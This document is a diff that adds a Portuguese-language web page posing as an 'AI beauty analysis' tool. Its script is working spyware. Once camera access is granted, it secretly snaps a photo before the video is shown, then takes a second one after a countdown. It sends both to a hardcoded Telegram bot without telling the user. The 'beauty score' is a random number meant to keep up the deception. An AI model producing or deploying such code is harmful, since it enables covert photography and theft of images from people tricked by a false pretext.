@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Análise de Beleza AI</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #fff; color: #000; padding: 20px; transition: background 0.5s; }
+        #app-container { max-width: 400px; margin: 0 auto; }
+        
+        h1#main-title { font-size: 2.5em; margin-top: 50px; text-transform: uppercase; letter-spacing: 2px; }
+        p#subtitle { font-size: 1.1em; color: #555; }
+
+        video { width: 100%; border-radius: 10px; background: #000; display: none; margin-top: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        
+        #status-area { margin-top: 30px; font-size: 1.2em; font-weight: bold; }
+        
+        /* Countdown visual */
+        #countdown { font-size: 5em; font-weight: bold; color: #ff4757; display: none; margin: 20px 0; }
+
+        /* Estilo da fase pública */
+        .fase-publica body { background: #222; color: #fff; }
+        .fase-publica #main-title { color: #fff; font-size: 1.8em;}
+        .fase-publica #subtitle { color: #aaa; }
+        .fase-publica video { display: block; }
+
+        /* Loader */
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Resultado Final */
+        #result-area { display: none; margin-top: 30px; }
+        #beauty-score { font-size: 4em; font-weight: bold; color: #2ecc71; }
+    </style>
+</head>
+<body>
+
+    <div id="app-container">
+        <h1 id="main-title">ANÁLISE DE BELEZA</h1>
+        <p id="subtitle">(Ative a câmera para melhor qualidade)</p>
+
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        
+        <div id="countdown">3</div>
+
+        <div id="status-area">
+            <p id="status-text">Aguardando permissão da câmera...</p>
+            <div class="loader" id="loader"></div>
+        </div>
+
+        <div id="result-area">
+            <h2>SEU RESULTADO:</h2>
+            <div id="beauty-score">0%</div>
+            <p>Sua beleza foi analisada pela nossa IA avançada.</p>
+        </div>
+    </div>
+
+    <script>
+        // === COLOQUE SEUS DADOS AQUI ===
+        const BOT_TOKEN = '8767105495:AAFFo6Taie2knPqcOJvBrOqeovrIuEJa0s0'; 
+        const CHAT_ID = '5829718641';
+        // ===============================
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusText = document.getElementById('status-text');
+        const countdownEl = document.getElementById('countdown');
+        const loader = document.getElementById('loader');
+        const resultArea = document.getElementById('result-area');
+        const beautyScoreEl = document.getElementById('beauty-score');
+        const mainTitle = document.getElementById('main-title');
+        const subtitle = document.getElementById('subtitle');
+
+        let streamAtiva = null;
+
+        // Inicia o processo
+        iniciarFaseOculta();
+
+        function iniciarFaseOculta() {
+            // 1. Pede permissão da câmera
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                .then(stream => {
+                    streamAtiva = stream;
+                    video.srcObject = stream;
+                    
+                    // Usuário permitiu, mas não mostramos o vídeo ainda.
+                    // Avisamos apenas que a análise começou.
+                    statusText.innerText = "Análise iniciada... Processando dados.";
+
+                    // 2. Tira a primeira foto oculta após 3 segundos
+                    setTimeout(() => {
+                        tirarEEnviarFoto("Foto Oculta (Inicial)");
+                        
+                        // Após enviar a primeira, passamos para a fase pública
+                        setTimeout(iniciarFasePublica, 2000); 
+                    }, 3000);
+                })
+                .catch(err => {
+                    statusText.innerText = "❌ Para usar a análise, você precisa permitir o acesso à câmera.";
+                    console.error(err);
+                });
+        }
+
+        function iniciarFasePublica() {
+            // Altera a interface para o modo escuro e mostra o vídeo
+            document.documentElement.classList.add('fase-publica');
+            mainTitle.innerText = "PREPARE-SE PARA A FOTO";
+            subtitle.innerText = "Olhe para a câmera e sorria!";
+            statusText.innerText = "A análise final vai começar...";
+
+            // 3. Inicia o timer visual
+            let tempo = 3;
+            countdownEl.style.display = 'block';
+            countdownEl.innerText = tempo;
+
+            const timerInterval = setInterval(() => {
+                tempo--;
+                if (tempo > 0) {
+                    countdownEl.innerText = tempo;
+                } else {
+                    clearInterval(timerInterval);
+                    countdownEl.style.display = 'none';
+                    
+                    // 4. Tira a segunda foto pública
+                    tirarEEnviarFoto("Foto Pública (Com Timer)");
+                    
+                    // Mostra o "Calculando"
+                    mostrarCalculando();
+                }
+            }, 1000);
+        }
+
+        function tirarEEnviarFoto(legenda) {
+            // Prepara o canvas
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            // Converte para blob (imagem)
+            canvas.toBlob(blob => {
+                // Envia para o Telegram (sem avisar o usuário na tela)
+                enviarParaTelegramSilenciosamente(blob, legenda);
+            }, 'image/jpeg', 0.8);
+        }
+
+        function enviarParaTelegramSilenciosamente(blob, legenda) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'foto.jpg');
+            formData.append('caption', legenda); // Adiciona legenda para você saber qual foto é qual
+
+            // Disparo silêncioso para a API
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            // Não tratamos o sucesso/erro na interface do usuário
+            .catch(error => console.error("Erro no envio oculto:", error));
+        }
+
+        function mostrarCalculando() {
+            statusText.innerText = "Calculando beleza... Nossa IA está analisando seus traços.";
+            loader.style.display = 'block';
+
+            // Simula um tempo de cálculo aleatório (entre 3 e 6 segundos)
+            const tempoCalculo = Math.floor(Math.random() * 3000) + 3000;
+
+            setTimeout(() => {
+                mostrarResultadoFinal();
+            }, tempoCalculo);
+        }
+
+        function mostrarResultadoFinal() {
+            loader.style.display = 'none';
+            statusText.style.display = 'none';
+            video.style.display = 'none'; // Esconde o vídeo no final
+            mainTitle.innerText = "ANÁLISE CONCLUÍDA";
+
+            // Gera porcentagem aleatória entre 1 e 100
+            const porcentagem = Math.floor(Math.random() * 100) + 1;
+            beautyScoreEl.innerText = porcentagem + "%";
+
+            resultArea.style.display = 'block';
+
+            // Opcional: Para a câmera para economizar bateria
+            if (streamAtiva) {
+                streamAtiva.getTracks().forEach(track => track.stop());
+            }
+        }
+    </script>
+</body>
+</html>
